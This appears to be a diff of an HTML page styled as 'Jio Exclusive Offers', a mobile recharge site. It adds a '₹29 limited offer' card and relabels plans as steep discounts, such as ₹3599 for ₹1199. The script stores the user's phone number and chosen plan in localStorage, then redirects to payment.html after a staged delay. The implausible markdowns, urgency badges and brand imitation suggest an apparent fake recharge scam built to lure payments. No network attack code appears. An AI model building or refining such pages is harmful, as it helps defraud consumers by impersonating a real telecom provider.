@@ -56,6 +56,11 @@
         }
 
         .plan-tag { font-size: 11px; font-weight: 700; color: #64748b; background: #f1f5f9; padding: 4px 10px; border-radius: 10px; display: inline-block; margin-top: 5px; }
+        
+        .special-offer {
+            border-left: 8px solid #ec489a;
+            background: linear-gradient(135deg, #fff 0%, #fdf2f8 100%);
+        }
     </style>
 </head>
 <body class="bg-gray-50 pb-10">
@@ -86,10 +91,41 @@
         <h2 class="text-2xl font-extrabold text-gray-800 mb-6">Jio Exclusive Offers</h2>
         <div class="space-y-6">
             
+            <!-- 🔥 ₹69 Plan (Originally ₹69, Now ₹29) - SAME FEATURES -->
+            <div class="recharge-card special-offer">
+                <div class="flex justify-between items-start">
+                    <div>
+                        <div class="flex items-center space-x-2">
+                            <span class="bg-pink-100 text-pink-700 text-[11px] font-black px-2 py-0.5 rounded-full">🔥 Limited Offer</span>
+                            <span class="text-sm line-through text-gray-400">₹69</span>
+                            <span class="text-2xl font-black text-pink-600">₹29</span>
+                        </div>
+                        <p class="text-sm font-bold text-gray-700 mt-1">Validity: 7 Days</p>
+                        <div class="flex flex-wrap gap-2 mt-2">
+                            <span class="plan-tag">📦 6 GB Total Data</span>
+                            <span class="plan-tag">🔇 No Voice</span>
+                            <span class="plan-tag">📨 No SMS</span>
+                            <span class="plan-tag">⚡ Data Only Pack</span>
+                        </div>
+                    </div>
+                    <div onclick="openInfoSpecial()" class="info-btn"><i class="fa-solid fa-info text-xs"></i></div>
+                </div>
+                <div class="mt-6 flex justify-end">
+                    <button onclick="startRecharge(this, 'Jio ₹69 Data Pack (Special ₹29)', 29, '🔥 Special Offer: Original ₹69 pack now at ₹29! | Validity: 7 Days | Data: 6 GB Total | Voice: NA | SMS: NA | Data Only Pack - No Voice, No SMS')" class="btn-3d" style="background: linear-gradient(180deg, #EC489A 0%, #BE185D 100%); box-shadow: 0 5px 0px #831843;">
+                        <div class="loader"></div>
+                        <span>Recharge ₹29</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Jio ₹120 Plan (Originally ₹349, Now ₹120) -->
             <div class="recharge-card border-l-8 border-indigo-600">
                 <div class="flex justify-between items-start">
                     <div>
-                        <div class="flex items-center space-x-2"><span class="text-sm line-through text-gray-400">₹349</span><span class="text-2xl font-black text-indigo-600">₹120</span></div>
+                        <div class="flex items-center space-x-2">
+                            <span class="text-sm line-through text-gray-400">₹349</span>
+                            <span class="text-2xl font-black text-indigo-600">₹120</span>
+                        </div>
                         <p class="text-sm font-bold text-gray-700">Validity: 28 Days</p>
                         <div class="flex flex-wrap gap-2 mt-2">
                             <span class="plan-tag">Unlimited Voice</span>
@@ -100,14 +136,18 @@
                     <div onclick="openInfo()" class="info-btn"><i class="fa-solid fa-info text-xs"></i></div>
                 </div>
                 <div class="mt-6 flex justify-end">
-                    <button onclick="startRecharge(this, 'Jio Plan ₹120', 120, 'Unlimited Voice Calls, 100 SMS per day, Unlimited True 5G Data, 28 Days Validity')" class="btn-3d"><div class="loader"></div><span>Recharge</span></button>
+                    <button onclick="startRecharge(this, 'Jio ₹349 Plan (Special ₹120)', 120, 'Original ₹349 pack now at ₹120! | Unlimited Voice Calls, 100 SMS per day, Unlimited True 5G Data, 28 Days Validity')" class="btn-3d"><div class="loader"></div><span>Recharge ₹120</span></button>
                 </div>
             </div>
 
+            <!-- Jio ₹348 Plan (Originally ₹899, Now ₹348) -->
             <div class="recharge-card border-l-8 border-emerald-500">
                 <div class="flex justify-between items-start">
                     <div>
-                        <div class="flex items-center space-x-2"><span class="text-sm line-through text-gray-400">₹899</span><span class="text-2xl font-black text-emerald-600">₹348</span></div>
+                        <div class="flex items-center space-x-2">
+                            <span class="text-sm line-through text-gray-400">₹899</span>
+                            <span class="text-2xl font-black text-emerald-600">₹348</span>
+                        </div>
                         <p class="text-sm font-bold text-gray-700">Validity: 90 Days</p>
                         <div class="flex flex-wrap gap-2 mt-2">
                             <span class="plan-tag">Unlimited Voice</span>
@@ -118,14 +158,18 @@
                     <div onclick="openInfo()" class="info-btn"><i class="fa-solid fa-info text-xs"></i></div>
                 </div>
                 <div class="mt-6 flex justify-end">
-                    <button onclick="startRecharge(this, 'Jio Plan ₹348', 348, 'Unlimited Voice, 100 SMS/Day, 2GB Data per day + 5G Unlimited, 90 Days Validity')" class="btn-3d" style="background: linear-gradient(180deg, #10B981 0%, #059669 100%); box-shadow: 0 5px 0px #065F46;"><div class="loader"></div><span>Recharge</span></button>
+                    <button onclick="startRecharge(this, 'Jio ₹899 Plan (Special ₹348)', 348, 'Original ₹899 pack now at ₹348! | Unlimited Voice, 100 SMS/Day, 2GB Data per day + 5G Unlimited, 90 Days Validity')" class="btn-3d" style="background: linear-gradient(180deg, #10B981 0%, #059669 100%); box-shadow: 0 5px 0px #065F46;"><div class="loader"></div><span>Recharge ₹348</span></button>
                 </div>
             </div>
 
+            <!-- Jio ₹1199 Plan (Originally ₹3599, Now ₹1199) -->
             <div class="recharge-card border-l-8 border-orange-500">
                 <div class="flex justify-between items-start">
                     <div>
-                        <div class="flex items-center space-x-2"><span class="text-sm line-through text-gray-400">₹3599</span><span class="text-2xl font-black text-orange-600">₹1199</span></div>
+                        <div class="flex items-center space-x-2">
+                            <span class="text-sm line-through text-gray-400">₹3599</span>
+                            <span class="text-2xl font-black text-orange-600">₹1199</span>
+                        </div>
                         <p class="text-sm font-bold text-gray-700">Validity: 365 Days</p>
                         <div class="flex flex-wrap gap-2 mt-2">
                             <span class="plan-tag">Unlimited Voice</span>
@@ -136,7 +180,7 @@
                     <div onclick="openInfo()" class="info-btn"><i class="fa-solid fa-info text-xs"></i></div>
                 </div>
                 <div class="mt-6 flex justify-end">
-                    <button onclick="startRecharge(this, 'Jio Plan ₹1199', 1199, 'Unlimited Voice Calls, 100 SMS/Day, 2.5GB Data per day + Annual 5G, 365 Days Validity')" class="btn-3d" style="background: linear-gradient(180deg, #F97316 0%, #EA580C 100%); box-shadow: 0 5px 0px #9A3412;"><div class="loader"></div><span>Recharge</span></button>
+                    <button onclick="startRecharge(this, 'Jio ₹3599 Plan (Special ₹1199)', 1199, 'Original ₹3599 pack now at ₹1199! | Unlimited Voice Calls, 100 SMS/Day, 2.5GB Data per day + Annual 5G, 365 Days Validity')" class="btn-3d" style="background: linear-gradient(180deg, #F97316 0%, #EA580C 100%); box-shadow: 0 5px 0px #9A3412;"><div class="loader"></div><span>Recharge ₹1199</span></button>
                 </div>
             </div>
         </div>
@@ -145,8 +189,24 @@
     <div id="infoModal">
         <div class="modal-content">
             <button onclick="closeInfo()" class="absolute top-4 right-4 text-gray-400 text-xl"><i class="fa-solid fa-circle-xmark"></i></button>
-            <h3 class="text-xl font-black text-gray-900 mb-4">Jio Plan Details</h3>
-            <p class="text-sm text-gray-600">Special benefits: Unlimited Voice + High Speed Data + Premium 5G access for active users.</p>
+            <h3 class="text-xl font-black text-gray-900 mb-4">Plan Details</h3>
+            <p class="text-sm text-gray-600">Standard plan with Unlimited Voice + High Speed Data + Premium 5G access.</p>
+        </div>
+    </div>
+
+    <div id="infoModalSpecial">
+        <div class="modal-content">
+            <button onclick="closeInfoSpecial()" class="absolute top-4 right-4 text-gray-400 text-xl"><i class="fa-solid fa-circle-xmark"></i></button>
+            <h3 class="text-xl font-black text-gray-900 mb-2">🔥 Special ₹29 Offer</h3>
+            <ul class="text-sm text-gray-700 space-y-2 list-disc pl-4">
+                <li>💰 <strong>Original Price:</strong> ₹69</li>
+                <li>🎉 <strong>Offer Price:</strong> ₹29 only!</li>
+                <li>📦 <strong>Data:</strong> 6 GB Total</li>
+                <li>📅 <strong>Validity:</strong> 7 Days</li>
+                <li>🔇 <strong>Voice:</strong> Not Available</li>
+                <li>📨 <strong>SMS:</strong> Not Available</li>
+                <li>⚡ <strong>Type:</strong> Data Only Pack</li>
+            </ul>
         </div>
     </div>
 
@@ -169,6 +229,8 @@
                     localStorage.setItem('jioTarget', fullNum);
                     isConfirmed = true; 
                     document.getElementById('numberInputSection').style.display = 'none';
+                    loader.style.display = 'none';
+                    text.innerText = 'Confirmed!';
                 }, 2000);
             } else {
                 triggerError();
@@ -196,7 +258,7 @@
 
             localStorage.setItem('selectedPlan', plan);
             localStorage.setItem('selectedPrice', price);
-            localStorage.setItem('planBenefits', benefits); // Correct Data Sent
+            localStorage.setItem('planBenefits', benefits);
             localStorage.setItem('finalTarget', localStorage.getItem('jioTarget')); 
 
             setTimeout(() => { window.location.href = "payment.html"; }, 2000);
@@ -204,8 +266,14 @@
 
         function openInfo() { document.getElementById('infoModal').style.display = 'flex'; }
         function closeInfo() { document.getElementById('infoModal').style.display = 'none'; }
+
+        function openInfoSpecial() { document.getElementById('infoModalSpecial').style.display = 'flex'; }
+        function closeInfoSpecial() { document.getElementById('infoModalSpecial').style.display = 'none'; }
         
-        window.onload = () => { localStorage.removeItem('jioTarget'); };
+        window.onload = () => { 
+            localStorage.removeItem('jioTarget');
+            isConfirmed = false;
+        };
     </script>
 </body>
 </html>
